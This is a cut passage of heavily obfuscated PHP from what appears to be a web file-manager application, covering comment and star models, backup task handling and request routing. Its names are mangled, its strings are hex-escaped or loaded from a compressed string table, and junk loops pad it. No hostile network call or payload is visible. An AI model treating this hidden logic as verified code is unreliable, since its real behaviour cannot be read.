($GLOBALS[$¶»Ö³ø[6]][$¶»Ö³ø[89]][$¶»Ö³ø[1882]] != $¶»Ö³ø[88]) { return !0; } $›©ğÔ©Ò = $this->config(); if (!$›©ğÔ©Ò || $›©ğÔ©Ò[$¶»Ö³ø[1635]] != $¶»Ö³ø[88]) { return !1; } $±²ñ«‹ = $this->process(); foreach ($±²ñ«‹ as $¬Œ„€ØÊ) { if ($¬Œ„€ØÊ) { return Task::restart($¬Œ„€ØÊ[$¶»Ö³ø[399]]); } } $ò›£®Úó = new Backup(); $½¼”†¼“ = $ò›£®Úó->db(); if ($½¼”†¼“) { $½¼”†¼“ = $ò›£®Úó->dbFile(); if ($½¼”†¼“ && $›©ğÔ©Ò[$¶»Ö³ø[753]] == $¶»Ö³ø[198]) { $½¼”†¼“ = $ò›£®Úó->file(); } } Backup::set(array($¶»Ö³ø[748] => 1, $¶»Ö³ø[760] => time())); return !0; } public function process() { $±éŒŸßµ =& $_SERVER[Ó¡Ÿ§‚]; $Ü†÷¬™ƒ = array($±éŒŸßµ[756] => Task::get($±éŒŸßµ[778]), $±éŒŸßµ[761] => Task::get($±éŒŸßµ[799]), $±éŒŸßµ[200] => Task::get($±éŒŸßµ[808])); $¤Ğª•èò = !1; foreach ($Ü†÷¬™ƒ as &$ˆºèìË) { if ($¤Ğª•èò) { $ˆºèìË = !1; continue; } if ($ˆºèìË) { $»ùğ¬ô = intval(_get($ˆºèìË, $±éŒŸßµ[1670], 0)); if (time() - $»ùğ¬ô > 7200) { Task::kill($ˆºèìË[$±éŒŸßµ[399]]); $¤Ğª•èò = !0; $ˆºèìË = !1; } } } return $Ü†÷¬™ƒ; } public function restore() { $„»ÑÚüÒ =& $_SERVER[Ó¡Ÿ§‚]; ActionCall($„»ÑÚüÒ[1059], !0, 1); ActionCall($„»ÑÚüÒ[1059], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\156\x74"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\x6d\145" => "\143\157\155\155\x65\x6e\x74\x5f\155\145\164\x61", "\x6d\x65\x74\x61\x46\x69\x65\154\144" => "\x63\157\x6d\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($‚éÏŠ‹Ä) { $å“®‡… =& $_SERVER[Ó¡Ÿ§‚]; if ($‚éÏŠ‹Ä[$å“®‡…[1883]]) { $ãİ†š÷– = $this->where(array($å“®‡…[1884] => $‚éÏŠ‹Ä[$å“®‡…[1883]]))->find(); if (!$ãİ†š÷– || $ãİ†š÷–[$å“®‡…[420]] != $‚éÏŠ‹Ä[$å“®‡…[420]] || $ãİ†š÷–[$å“®‡…[505]] != $‚éÏŠ‹Ä[$å“®‡…[505]]) { return !1; } $this->where(array($å“®‡…[1884] => $‚éÏŠ‹Ä[$å“®‡…[1883]]))->setAdd($å“®‡…[1885], 1); } $‚éÏŠ‹Ä[$å“®‡…[1886]] = 0; $‚éÏŠ‹Ä[$å“®‡…[1885]] = 0; $‚éÏŠ‹Ä[$å“®‡…[748]] = 1; return $this->add($‚éÏŠ‹Ä); } public function commentCount($ü™¢èæ, $È¦èö™², $¾³ÆÉ–â = false) { $õ»Ÿô©ä =& $_SERVER[Ó¡Ÿ§‚]; if (!$ü™¢èæ) { return array(); } if (is_string($ü™¢èæ) || is_int($ü™¢èæ)) { $ü™¢èæ = array($ü™¢èæ); } $Å¶·ù¿® = array($õ»Ÿô©ä[505], $õ»Ÿô©ä[1887] => $õ»Ÿô©ä[500]); $ü°´Õû = array($õ»Ÿô©ä[505] => array($õ»Ÿô©ä[7], $ü™¢èæ), $õ»Ÿô©ä[420] => $È¦èö™²); if ($¾³ÆÉ–â) { $ü°´Õû[$õ»Ÿô©ä[1665]] = $¾³ÆÉ–â; } $ÒÙ…°ÑÄ = $this->field($Å¶·ù¿®)->where($ü°´Õû)->group($õ»Ÿô©ä[505])->select(); return array_to_keyvalue($ÒÙ…°ÑÄ, $õ»Ÿô©ä[505], $õ»Ÿô©ä[500]); } public function starTarget($Ï×šÚŠ½, $ŸÖ¯²¸Ù) { $é—šŒ‡¥ =& $_SERVER[Ó¡Ÿ§‚]; $ŸÃäµĞÁ = $Ï×šÚŠ½ + self::TYPE_STAR_OFFSET; $Û€ù†Œ = array($é—šŒ‡¥[1665] => USER_ID, $é—šŒ‡¥[420] => $ŸÃäµĞÁ, $é—šŒ‡¥[505] => $ŸÖ¯²¸Ù); $‰İ¥¾Û = $this->where($Û€ù†Œ)->find(); if ($‰İ¥¾Û) { return $this->where(array($é—šŒ‡¥[399] => $‰İ¥¾Û[$é—šŒ‡¥[399]]))->delete(); } $§îå»à¥ = array($é—šŒ‡¥[1883] => 0, $é—šŒ‡¥[1665] => USER_ID, $é—šŒ‡¥[748] => 1, $é—šŒ‡¥[753] => $é—šŒ‡¥[12], $é—šŒ‡¥[420] => $ŸÃäµĞÁ, $é—šŒ‡¥[505] => $ŸÖ¯²¸Ù, $é—šŒ‡¥[1886] => 0, $é—šŒ‡¥[1885] => 0); return $this->add($§îå»à¥); } public function starTargetCount($ş”¿Êü©, $ğò»è·) { $ÜòÚ¯ß =& $_SERVER[Ó¡Ÿ§‚]; $«§ÅÖñè = $ğò»è· + self::TYPE_STAR_OFFSET; $şˆß–ù³ = $this->commentCount($ş”¿Êü©, $«§ÅÖñè); $·„¤¾ü = $this->commentCount($ş”¿Êü©, $«§ÅÖñè, USER_ID); return array($ÜòÚ¯ß[1888] => $şˆß–ù³, $ÜòÚ¯ß[1889] => $·„¤¾ü); } public function starTargetUserList($…Öı¶Ãä, $µçÓ¹¬ò) { $–Òº±­æ =& $_SERVER[Ó¡Ÿ§‚]; $ß»â”ÏÍ = $…Öı¶Ãä + self::TYPE_STAR_OFFSET; $¤ŒšûºÏ = array($–Òº±­æ[505] => $µçÓ¹¬ò, $–Òº±­æ[420] => $ß»â”ÏÍ); $€ª¡ÓĞ¢ = $this->where($¤ŒšûºÏ)->count(); $¬é‰÷ÜÙ = array($–Òº±­æ[255] => $€ª¡ÓĞ¢, $–Òº±­æ[1890] => array()); if (!$€ª¡ÓĞ¢) { return $¬é‰÷ÜÙ; } $ì·ª Õ¥ = $this->field($–Òº±­æ[1665])->where($¤ŒšûºÏ)->limit(500)->select(); $ì·ª Õ¥ = array_to_keyvalue($ì·ª Õ¥, $–Òº±­æ[12], $–Òº±­æ[1665]); $¬é‰÷ÜÙ[$–Òº±­æ[1890]] = Model($–Òº±­æ[513])->userListInfo($ì·ª Õ¥); return $¬é‰÷ÜÙ; } public function prasiseUserList($ƒ¸‡¬¬¿) { $§”à£“ı =& $_SERVER[Ó¡Ÿ§‚]; $ŠĞÚßûÆ = array($§”à£“ı[1891] => $ƒ¸‡¬¬¿); $ŞÓğÃŠ = $this->where($ŠĞÚßûÆ)->find(); $Óºäâ«® = _get($ŞÓğÃŠ, $§”à£“ı[1886], 0); $ë¬¼ù×ó = array($§”à£“ı[255] => $Óºäâ«®, $§”à£“ı[1890] => array()); if (!$Óºäâ«®) { return $ë¬¼ù×ó; } $æââÈ«ğ = Model($§”à£“ı[1892])->field($§”à£“ı[1665])->where($ŠĞÚßûÆ)->limit(500)->select(); $æââÈ«ğ = array_to_keyvalue($æââÈ«ğ, $§”à£“ı[12], $§”à£“ı[1665]); $ë¬¼ù×ó[$§”à£“ı[1890]] = Model($§”à£“ı[513])->userListInfo($æââÈ«ğ); return $ë¬¼ù×ó; } public function remove($åˆİá¥Ä) { $À•ö¥±« =& $_SERVER[Ó¡Ÿ§‚]; $â³ú×§İ = array($À•ö¥±«[1884] => $åˆİá¥Ä); $©µü„Í = $this->where($â³ú×§İ)->find(); if ($©µü„Í[$À•ö¥±«[1883]]) { $this->where(array($À•ö¥±«[1884] => $©µü„Í[$À•ö¥±«[1883]]))->setAdd($À•ö¥±«[1885], -1); } return $this->where($â³ú×§İ)->delete(); } public function edit($ÓóîÏ¦æ, $ÚŒ§Ñ…‘) { $ç€ßİîç =& $_SERVER[Ó¡Ÿ§‚]; $±’ÚÆœø = array($ç€ßİîç[1884] => $ÓóîÏ¦æ); return $this->where($±’ÚÆœø)->save(array($ç€ßİîç[1893] => $ÚŒ§Ñ…‘)); } public function prasise($œ…£ÁÀà) { $›˜İÈ½¶ =& $_SERVER[Ó¡Ÿ§‚]; $€ß„Ã ¬ = Model($›˜İÈ½¶[1894]); $÷‚Éâè = array($›˜İÈ½¶[1884] => $œ…£ÁÀà, $›˜İÈ½¶[1656] => USER_ID); $Ø›­ğ±ˆ = $€ß„Ã ¬->where($÷‚Éâè)->find(); if (!$Ø›­ğ±ˆ) { $€ß„Ã ¬->add($÷‚Éâè); $Œ®“½¹ë = $this->where(array($›˜İÈ½¶[1884] => $œ…£ÁÀà))->setAdd($›˜İÈ½¶[1886], 1); } else { $€ß„Ã ¬->where($÷‚Éâè)->delete(); $Œ®“½¹ë = $this->where(array($›˜İÈ½¶[1884] => $œ…£ÁÀà))->setAdd($›˜İÈ½¶[1886], -1); } return $Œ®“½¹ë; } public function targetInfo($ˆÇÅáäÚ, $Ô´àêç) { $¡ç²šÑ =& $_SERVER[Ó¡Ÿ§‚]; $œ¤äãÅ³ = array($¡ç²šÑ[585] => $ˆÇÅáäÚ, $¡ç²šÑ[586] => $Ô´àêç); $Ø‚— = $this->where($œ¤äãÅ³)->count(); $ùûãÆ® = "\x52\111\107\x48\x54\40\112\117\111\116\40{$this->tablePrefix}\x63\x6f\x6d\155\145\x6e\x74\137\160\x72\x61\151\163\x65\40\x73\x74\x61\162\x20\x6f\x6e\x20\143\x6f\155\155\x65\x6e\164\x2e\x63\157\x6d\155\145\x6e\164\111\x44\x20\x3d\40\x73\164\141\x72\x2e\x63\x6f\x6d\x6d\145\156\164\x49\x44"; $¿·Ù–À = $this->alias($¡ç²šÑ[354])->where($œ¤äãÅ³)->join($ùûãÆ®, $¡ç²šÑ[1895])->count(); $°“úè = array($¡ç²šÑ[1896] => $Ø‚—, $¡ç²šÑ[1897] => $¿·Ù–À); return $°“úè; } public function listData($ƒ¸ÓÊ¶) { $ éÕàçÇ =& $_SERVER[Ó¡Ÿ§‚]; if (isset($ƒ¸ÓÊ¶[$ éÕàçÇ[1898]])) { if ($ƒ¸ÓÊ¶[$ éÕàçÇ[1898]]) { $ƒ¸ÓÊ¶[$ éÕàçÇ[1891]] = array($ éÕàçÇ[1013], intval($ƒ¸ÓÊ¶[$ éÕàçÇ[1898]])); } unset($ƒ¸ÓÊ¶[$ éÕàçÇ[1898]]); } if (isset($ƒ¸ÓÊ¶[$ éÕàçÇ[1899]])) { if ($ƒ¸ÓÊ¶[$ éÕàçÇ[1899]]) { $ƒ¸ÓÊ¶[$ éÕàçÇ[1891]] = array($ éÕàçÇ[1010], intval($ƒ¸ÓÊ¶[$ éÕàçÇ[1899]])); } unset($ƒ¸ÓÊ¶[$ éÕàçÇ[1899]]); } return $this->_listData($ƒ¸ÓÊ¶); } private function _listData($ƒìÙ‹ÆÇ) { $òˆƒü‡ß =& $_SERVER[Ó¡Ÿ§‚]; $šƒ¥ù“– = $this->where($ƒìÙ‹ÆÇ)->_makeOrder()->selectPage(100); $this->_listAppendParent($šƒ¥ù“–[$òˆƒü‡ß[369]]); $this->_listAppendUser($šƒ¥ù“–[$òˆƒü‡ß[369]]); $this->_listAppendMeta($šƒ¥ù“–[$òˆƒü‡ß[369]]); return $šƒ¥ù“–; } private function _makeOrder() { $£èó¸–Å =& $_SERVER[Ó¡Ÿ§‚]; $¢±–Ûİ± = array($£èó¸–Å[1886], $£èó¸–Å[1885], $£èó¸–Å[201]); $ç„Ç˜ï = Input::get($£èó¸–Å[466], $£èó¸–Å[7], $£èó¸–Å[432], $¢±–Ûİ±); $ÉßË¦Ää = Input::get($£èó¸–Å[467], $£èó¸–Å[7], $£èó¸–Å[1658], array($£èó¸–Å[1900], $£èó¸–Å[462])); $”çÇÜ¨¸ = $ç„Ç˜ï . $£èó¸–Å[53] . $ÉßË¦Ää; return $this->order($”çÇÜ¨¸); } private function _listAppendParent(&$ŒŒ¾Ë­) { $¾¨ˆØüÆ =& $_SERVER[Ó¡Ÿ§‚]; $„ÉµÜè® = array_unique(array_to_keyvalue($ŒŒ¾Ë­, $¾¨ˆØüÆ[12], $¾¨ˆØüÆ[1883])); $„ÉµÜè® = array_remove_value($„ÉµÜè®, $¾¨ˆØüÆ[198]); if (!$„ÉµÜè®) { return; } $™½ú¥¬œ = $this->where(array($¾¨ˆØüÆ[1884] => array($¾¨ˆØüÆ[7], $„ÉµÜè®)))->select(); $™½ú¥¬œ = array_to_keyvalue($™½ú¥¬œ, $¾¨ˆØüÆ[1891]); foreach ($ŒŒ¾Ë­ as &$ñ»ùõ¥) { if (isset($™½ú¥¬œ[$ñ»ùõ¥[$¾¨ˆØüÆ[1883]]])) { $ñ»ùõ¥[$¾¨ˆØüÆ[1901]] = $™½ú¥¬œ[$ñ»ùõ¥[$¾¨ˆØüÆ[1883]]]; } } unset($ñ»ùõ¥); } private function _listAppendUser(&$Ùº‚å²) { $­½ÛîÇå =& $_SERVER[Ó¡Ÿ§‚]; $çòÜ••ø = array_unique(array_to_keyvalue($Ùº‚å², $­½ÛîÇå[12], $­½ÛîÇå[1665])); $çòÜ••ø = array_remove_value($çòÜ••ø, $­½ÛîÇå[198]); if (count($çòÜ••ø) == 0) { return; } foreach ($Ùº‚å² as $›ïó…) { if (isset($›ïó…[$­½ÛîÇå[1901]])) { $çòÜ••ø[] = $›ïó…[$­½ÛîÇå[1901]][$­½ÛîÇå[1665]]; } } $Åú‹²õ¡ = Model($­½ÛîÇå[534])->userListInfo($çòÜ••ø); foreach ($Ùº‚å² as &$›ïó…) { $›ïó…[$­½ÛîÇå[599]] = $Åú‹²õ¡[$›ïó…[$­½ÛîÇå[1665]]]; if (isset($›ïó…[$­½ÛîÇå[1901]])) { $›ïó…[$­½ÛîÇå[1901]][$­½ÛîÇå[599]] = $Åú‹²õ¡[$›ïó…[$­½ÛîÇå[1901]][$­½ÛîÇå[1665]]]; } } unset($›ïó…); } private function _listAppendMeta(&$×æ‡“¼÷) { $Åòô¹è =& $_SERVER[Ó¡Ÿ§‚]; $Û¿ª‹ù = array_unique(array_to_keyvalue($×æ‡“¼÷, $Åòô¹è[12], $Åòô¹è[1891])); $Û¿ª‹ù = array_remove_value($Û¿ª‹ù, $Åòô¹è[198]); if (!$Û¿ª‹ù) { return; } foreach ($×æ‡“¼÷ as $–ÈÊÜ—‡) { if (isset($–ÈÊÜ—‡[$Åòô¹è[1901]])) { $Û¿ª‹ù[] = $–ÈÊÜ—‡[$Åòô¹è[1901]][$Åòô¹è[1891]]; } } $ååíÛĞº = $this->metaList($Û¿ª‹ù); if (!$ååíÛĞº) { return !1; } foreach ($×æ‡“¼÷ as &$–ÈÊÜ—‡) { $–ÈÊÜ—‡[$Åòô¹è[475]] = $ååíÛĞº[$–ÈÊÜ—‡[$Åòô¹è[1891]]]; if (isset($–ÈÊÜ—‡[$Åòô¹è[1901]])) { $–ÈÊÜ—‡[$Åòô¹è[1901]][$Åòô¹è[475]] = $ååíÛĞº[$–ÈÊÜ—‡[$Åòô¹è[1901]][$Åòô¹è[1891]]]; } } unset($–ÈÊÜ—‡); } private function metaList($¾º®¡ğ¥) { $ŸÚœÁ¿‡ =& $_SERVER[Ó¡Ÿ§‚]; if (!$¾º®¡ğ¥) { return array(); } $êè íĞÊ = array($ŸÚœÁ¿‡[1891] => array($ŸÚœÁ¿‡[7], $¾º®¡ğ¥)); $¶¿Ë°‘ = Model($ŸÚœÁ¿‡[1902])->where($êè íĞÊ)->select(); $¶¿Ë°‘ = array_to_keyvalue_group($¶¿Ë°‘, $ŸÚœÁ¿‡[1891]); foreach ($¶¿Ë°‘ as $å¾‘î˜ó => $ÉÅ×Ó§­) { $‡öô†Í¹ = array(); foreach ($ÉÅ×Ó§­ as $œ™´ íİ) { $‡öô†Í¹[$œ™´ íİ[$ŸÚœÁ¿‡[94]]] = $œ™´ íİ[$ŸÚœÁ¿‡[374]]; } $¶¿Ë°‘[$å¾‘î˜ó] = $‡öô†Í¹; } return $¶¿Ë°‘ ? $¶¿Ë°‘ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\154\x65\x5f\143\x6f\156\x74\145\x6e\x74\x73"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\x54\x69\155\x65", "\x74\x69\155\145", "\151\x6e\163\x65\162\x74", "\146\165\156\143\x74\151\157\x6e")); } goto cÅ¼ØØÍ‘ò; b¼ŠÏç·Û: $_SERVER[â¥“Ú£Ö] = explode($_SERVER[Ó¡Ÿ§‚][616], gzinflate(substr($_SERVER[Ó¡Ÿ§‚][617], 10, -8))); $qpjvozehrm = $_SERVER[Ó¡Ÿ§‚][618]; class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\151\x6e\x64\145\170"; private $defaultAction = "\x69\156\x64\x65\170"; function __construct() { } public function setDefault($Øë·…˜) { $Ÿ×ªçˆ¨ =& $_SERVER[Ó¡Ÿ§‚]; $ºû¯é³  =& $_SERVER[â¥“Ú£Ö]; $éÑÆì¿¬ = explode($ºû¯é³ [0], trim($Øë·…˜, $ºû¯é³ [0])); $this->defaultModule = $éÑÆì¿¬[0] ? $éÑÆì¿¬[0] : $this->defaultModule; $èÆö¢¸Ñ = $Ÿ×ªçˆ¨[619]; $this->defaultController = $éÑÆì¿¬[1] ? $éÑÆì¿¬[1] : $this->defaultController; $this->defaultAction = $éÑÆì¿¬[2] ? $éÑÆì¿¬[2] : $this->defaultAction; $Ö÷ó€² = $Ÿ×ªçˆ¨[620]; $this->hdlw17b2ab84($ºû¯é³ [1], array($this, $ºû¯é³ [2])); } public function appRun($‡Š¾Àè) { $É”ı£å¸ =& $_SERVER[â¥“Ú£Ö]; $ä¨ÏÆ = explode($É”ı£å¸[0], $‡Š¾Àè); $˜õ’Ôâ‘ = strtolower($ä¨ÏÆ[0]); $ôÕå¦Ò = $É”ı£å¸[3]; if ($˜õ’Ôâ‘ == $É”ı£å¸[4]) { $ôÕå¦Ò = $É”ı£å¸[5]; $ä¨ÏÆ[0] = $É”ı£å¸[6]; $ä¨ÏÆ[1] = $ä¨ÏÆ[1] . $É”ı£å¸[7]; $‡Š¾Àè = join($É”ı£å¸[0], $ä¨ÏÆ); $‡Š¾Àè = trim($‡Š¾Àè, $É”ı£å¸[0]); } call_user_func(array($É”ı£å¸[8], $É”ı£å¸[9]), $ôÕå¦Ò . $É”ı£å¸[10], $‡Š¾Àè); ActionCall($‡Š¾Àè); call_user_func(array($É”ı£å¸[8], $É”ı£å¸[9]), $ôÕå¦Ò . $É”ı£å¸[11], $‡Š¾Àè); $Ä©€×ÑÇ = $_SERVER[Ó¡Ÿ§‚][621]; if (!$Ä©€×ÑÇ) { die; } } private function autorun() { $ûçˆÂ =& $_SERVER[â¥“Ú£Ö]; global $config; if (count($config[$ûçˆÂ[12]]) == 0) { return; } foreach ($config[$ûçˆÂ[12]] as $ŞÔò„ÏŸ => $Õƒì†·Ã) { $this->appRun($Õƒì†·Ã); } } private function ndzb3372a935() { $—â¯’ =& $_SERVER[Ó¡Ÿ§‚]; $°‡ñ½¥Ù =& $_SERVER[â¥“Ú£Ö]; $—íŒœ¯ü = $°‡ñ½¥Ù[4]; $æß½ü›Û = $—â¯’[622]; while ($æß½ü›Û < $—â¯’[623]) { if ($æß½ü›Û >= 0) { break; } $æß½ü›Û++; } $üÌ£²Â¸ = $GLOBALS[$°‡ñ½¥Ù[13]][$°‡ñ½¥Ù[14]][0]; if (!$üÌ£²Â¸ || strlen($üÌ£²Â¸) <= strlen($—íŒœ¯ü)) { return; } if (strtolower(substr($üÌ£²Â¸, -strlen($—íŒœ¯ü))) != $—íŒœ¯ü) { return; } $©ƒÉ“¿§ = substr($üÌ£²Â¸, 0, -strlen($—íŒœ¯ü)); $¨İ‰ÚêÃ = array($°‡ñ½¥Ù[4], $©ƒÉ“¿§); $Ñí‘„Úö = array_slice($GLOBALS[$°‡ñ½¥Ù[13]][$°‡ñ½¥Ù[14]], 1); $«¿Ä±‚Û = $—â¯’[624]; if (strlen($«¿Ä±‚Û) < $—â¯’[625]) { die; } $GLOBALS[$°‡ñ½¥Ù[13]][$°‡ñ½¥Ù[14]] = array_merge($¨İ‰ÚêÃ, $Ñí‘„Úö); $‚ºéµ²Ÿ = $—â¯’[626]; $GLOBALS[$°‡ñ½¥Ù[13]][$°‡ñ½¥Ù[15]] = implode($°‡ñ½¥Ù[0], $GLOBALS[$°‡ñ½¥Ù[13]][$°‡ñ½¥Ù[14]]); $ÑÕ£èÃ¶ = $—â¯’[627]; while ($ÑÕ£èÃ¶ < $—â¯’[623]) { if ($ÑÕ£èÃ¶ >= 0) { break; } $ÑÕ£èÃ¶++; } } private function jevg9f61771d() { $¹¨ÂôÅ© =& $_SERVER[Ó¡Ÿ§‚]; $á……•¿Ó =& $_SERVER[â¥“Ú£Ö]; if ($GLOBALS[$á……•¿Ó[13]][$á……•¿Ó[15]] != $á……•¿Ó[6]) { return; } $ÃáÆü¿á = $_SERVER[$á……•¿Ó[16]]; $’œ§‹±õ = $¹¨ÂôÅ©[628]; $Ô¨›¤Ï• = $á……•¿Ó[17]; $©ÈøÜ¸’ = $¹¨ÂôÅ©[629]; while ($©ÈøÜ¸’ < $¹¨ÂôÅ©[630]) { if ($©ÈøÜ¸’ >= 0) { break; } $©ÈøÜ¸’++; } if (!strstr($ÃáÆü¿á, $Ô¨›¤Ï•)) { return; } $­ï «‚ = strrpos($ÃáÆü¿á, $Ô¨›¤Ï•); $Ü•†³ªë = $¹¨ÂôÅ©[631]; while (strlen($Ü•†³ªë) < $¹¨ÂôÅ©[625]) { if (!$Ü•†³ªë) { break; } $Ü•†³ªë++; } $Ã¯”±‹ = substr($ÃáÆü¿á, $­ï «‚ + strlen($Ô¨›¤Ï•)); $õóáì›è = $¹¨ÂôÅ©[632]; preg_match_all($á……•¿Ó[18], $Ã¯”±‹, $»ÆÎîİÍ); $¯›Äöì× = $¹¨ÂôÅ©[633]; $Ã¯”±‹ = trim($»ÆÎîİÍ[0][0], $á……•¿Ó[19]); $Ğıº—’÷ = $¹¨ÂôÅ©[634]; if (!$Ğıº—’÷) { return; } $GLOBALS[$á……•¿Ó[13]][$á……•¿Ó[14]] = explode($á……•¿Ó[19], $Ã¯”±‹); $—şÊŞ‘ = $¹¨ÂôÅ©[635]; while ($—şÊŞ‘ < $¹¨ÂôÅ©[625]) { if ($—şÊŞ‘ >= 0) { break; } $—şÊŞ‘++; } $GLOBALS[$á……•¿Ó[13]][$á……•¿Ó[15]] = implode($á……•¿Ó[0], $GLOBALS[$á……•¿Ó[13]][$á……•¿Ó[14]]); $ûğÕ©à„ = $¹¨ÂôÅ©[636]; while ($ûğÕ©à„ < $¹¨ÂôÅ©[630]) { if ($ûğÕ©à„ >= 0) { break; } $ûğÕ©à„++; } } public function run() { $óõéªğÖ =& $_SERVER[Ó¡Ÿ§‚]; $Ñ›¶ã½ë =& $_SERVER[â¥“Ú£Ö]; $this->jevg9f61771d(); $ÛÜáÁÕ = $óõéªğÖ[637]; while ($ÛÜáÁÕ < $óõéªğÖ[625]) { if ($ÛÜáÁÕ >= 0) { break; } $ÛÜáÁÕ++; } $this->ndzb3372a935(); $·èöë¸ı = $GLOBALS[$Ñ›¶ã½ë[13]][$Ñ›¶ã½ë[14]]; $èé©…æ = $GLOBALS[$Ñ›¶ã½ë[13]][$Ñ›¶ã½ë[15]]; $¶À¸¾ìâ = $óõéªğÖ[638]; if (!$¶À¸¾ìâ) { return; } define($Ñ›¶ã½ë[20], isset($·èöë¸ı[0]) && $·èöë¸ı[0] ? $·èöë¸ı[0] : $this->defaultModule); define($Ñ›¶ã½ë[21], isset($·èöë¸ı[1]) && $·èöë¸ı[0] ? $·èöë¸ı[1] : $this->defaultController); define($Ñ›¶ã½ë[22], isset($·èöë¸ı[2]) && $·èöë¸ı[0] ? $·èöë¸ı[2] : $this->defaultAction); $®½µí‘ = $óõéªğÖ[639]; if (strlen($®½µí‘) < $óõéªğÖ[406]) { return; } define($Ñ›¶ã½ë[23], MOD . $Ñ›¶ã½ë[0] . ST . $Ñ›¶ã½ë[0] . ACT); $_SERVER[$Ñ›¶ã½ë[24]] = strtolower(ACTION); $this->autorun(); if (count($·èöë¸ı) >= 3) { $this->appRun($èé©…æ); } else { $this->appRun(ACTION); } } private $ncmydd3e0569 = array(); private $axsb341bad3b = ''; public function bxuh483a9add() { $°İ¤•™œ =& $_SERVER[Ó¡Ÿ§‚]; $ƒªª÷‘­ =& $_SERVER[â¥“Ú£Ö]; $this->rokw59c36d78(); $œâ›Ù¦ = $°İ¤•™œ[640]; while (strlen($œâ›Ù¦) < $°İ¤•™œ[625]) { if (!$œâ›Ù¦) { break; } $œâ›Ù¦++; } $this->nywk89377c89(); $»ïŞµî = $°İ¤•™œ[641]; while (strlen($»ïŞµî) < $°İ¤•™œ[406]) { if (!$»ïŞµî) { break; } $»ïŞµî++; } $this->azse8a62fcd8(); $this->ydtee592d8b4(); $this->stzef7a9c502(); $this->sydpf5daf0de(); $this->mpyje40ef86f(); $§²˜° = $°İ¤•™œ[642]; while (strlen($§²˜°) < $°İ¤•™œ[643]) { if (!$§²˜°) { break; } $§²˜°++; } $this->hdlw17b2ab84($ƒªª÷‘­[25], array($this, $ƒªª÷‘­[26])); $this->hdlw17b2ab84($ƒªª÷‘­[27], array($this, $ƒªª÷‘­[28])); $şØİçã² = $°İ¤•™œ[644]; $this->hdlw17b2ab84($ƒªª÷‘­[29], array($this, $ƒªª÷‘­[30])); $this->hdlw17b2ab84($ƒªª÷‘­[31], array($this, $ƒªª÷‘­[32])); } public function nbyf58c0b05f($÷²‚µÊ¾) { $­™À…ô =& $_SERVER[Ó¡Ÿ§‚]; $ÍÛöå™Š =& $_SERVER[â¥“Ú£Ö]; $–ó™Îà¦ = Model($ÍÛöå™Š[33])->get(); $•áÛ¾ÔÕ = $­™À…ô[645]; if (!$•áÛ¾ÔÕ) { return; } $™öîâˆÊ = array($ÍÛöå™Š[34], $ÍÛöå™Š[35], $ÍÛöå™Š[36], $ÍÛöå™Š[37], $ÍÛöå™Š[38], $ÍÛöå™Š[39], $ÍÛöå™Š[40], $ÍÛöå™Š[41], $ÍÛöå™Š[42], $ÍÛöå™Š[43], $ÍÛöå™Š[44], $ÍÛöå™Š[45], $ÍÛöå™Š[46], $ÍÛöå™Š[47], $ÍÛöå™Š[48], $ÍÛöå™Š[49], $ÍÛöå™Š[50], $ÍÛöå™Š[51], $ÍÛöå™Š[52], $ÍÛöå™Š[53], $ÍÛöå™Š[54], $ÍÛöå™Š[55], $ÍÛöå™Š[56], $ÍÛöå™Š[57], $ÍÛöå™Š[58], $ÍÛöå™Š[59], $ÍÛöå™Š[60], $ÍÛöå™Š[61], $ÍÛöå™Š[62], $ÍÛöå™Š[63], $ÍÛöå™Š[64], $ÍÛöå™Š[65], $ÍÛöå™Š[66], $ÍÛöå™Š[67], $ÍÛöå™Š[68], $ÍÛöå™Š[69], $ÍÛöå™Š[70], $ÍÛöå™Š[71], $ÍÛöå™Š[72], $ÍÛöå™Š[73], $ÍÛöå™Š[74], $ÍÛöå™Š[75], $ÍÛöå™Š[76], $ÍÛöå™Š[77], $ÍÛöå™Š[78], $ÍÛöå™Š[79], $ÍÛöå™Š[80], $ÍÛöå™Š[81], $ÍÛöå™Š[82], $ÍÛöå™Š[83], $ÍÛöå™Š[84]); $†®ğèò… = $­™À…ô[646]; if (strlen($†®ğèò…) < $­™À…ô[406]) { return; } foreach ($™öîâˆÊ as $İÍ¾Œ¡¨) { $¹¢åÌ¼à = $GLOBALS[$ÍÛöå™Š[85]][$ÍÛöå™Š[86]][$İÍ¾Œ¡¨]; if (isset($–ó™Îà¦[$İÍ¾Œ¡¨])) { $¹¢åÌ¼à = $–ó™Îà¦[$İÍ¾Œ¡¨]; } $÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[88]][$İÍ¾Œ¡¨] = $¹¢åÌ¼à; } $•÷š¡ƒ = $÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[88]][$ÍÛöå™Š[46]]; unset($÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[89]][$ÍÛöå™Š[90]]); unset($÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[89]][$ÍÛöå™Š[91]]); $‘ì•ŠÅ® = $­™À…ô[647]; unset($÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[88]][$ÍÛöå™Š[46]]); unset($÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[88]][$ÍÛöå™Š[92]]); $ö»®–€­ = $­™À…ô[648]; if (!$ö»®–€­) { die; } $÷²‚µÊ¾[$ÍÛöå™Š[87]][$ÍÛöå™Š[88]][$ÍÛöå™Š[93]] = array($ÍÛöå™Š[94] => (int) $•÷š¡ƒ[$ÍÛöå™Š[95]], $ÍÛöå™Š[96] => (int) _get($•÷š¡ƒ, $ÍÛöå™Š[97], 0)); $¡Î²Ã = $­™À…ô[649]; if (!$¡Î²Ã) { return; } $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[99]] = Action($ÍÛöå™Š[100])->accessToken(); $÷²‚µÊ¾[$ÍÛöå™Š[98]][$ÍÛöå™Š[101]] = 